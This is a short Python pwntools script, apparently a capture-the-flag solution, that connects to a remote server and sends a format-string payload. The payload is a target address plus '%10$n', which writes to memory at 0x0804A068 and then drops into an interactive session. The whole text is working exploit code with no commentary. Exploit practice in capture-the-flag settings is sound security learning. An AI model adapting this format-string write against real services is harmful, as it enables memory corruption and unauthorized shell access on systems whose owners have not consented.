```
from pwn import *
context.log_level='debug'
sh=remote('61.147.171.105',50967)
addr=0x0804A068
sh.sendlineafter('name','a')
payload=p32(addr)+b'a'*4+b'%10$n'
sh.sendlineafter('',payload)
sh.interactive()
```